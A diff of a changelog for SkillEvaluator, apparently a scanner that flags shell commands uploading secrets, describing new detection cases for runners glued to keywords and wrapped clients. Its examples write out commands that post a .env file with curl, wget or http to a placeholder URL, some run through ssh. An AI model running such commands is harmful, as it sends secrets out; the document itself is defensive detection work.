@@ -543,8 +543,9 @@ All notable changes to SkillEvaluator are documented in this file.
   `ip netns exec`, warns on any client named after it, even one named only as
   data, as in `docker exec app apt-get install -y curl`. That holds when the
   runner is the command itself, including after a compound keyword, function
-  header, `case` pattern, or `coproc`
-  (`while true; do ssh host curl URL; done`), when it follows a pass-through
+  header, `case` pattern, or `coproc`, also when glued to it
+  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
+  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
   wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
   that wraps it is called. A runner reached through another command, as in
   `find . -exec ssh host curl URL \;` or
@@ -556,9 +557,11 @@ All notable changes to SkillEvaluator are documented in this file.
   `sudo < .env http URL`, `2>&1 < .env http URL`,
   `case "$1" in *) < .env http URL;; esac`, and
   `while read -r l; do http URL; done < .env` still warn. A function that wraps
-  a client, as in `up() { curl "$@"; }; up -d @.env URL`, is checked with that
-  client's rules, and a `$VAR` command word with no known value that is given a
-  URL gets the curl and wget upload rules. A substitution any of
+  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
+  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
+  and a `$VAR` command word with no known value, in an action that names curl
+  or wget as a word, gets the curl and wget upload rules, as in
+  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
   whose commands names a client or runner, such as `$(which curl)`,
   `$(env which curl)`, `$(cd /tmp && which curl)`,
   `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
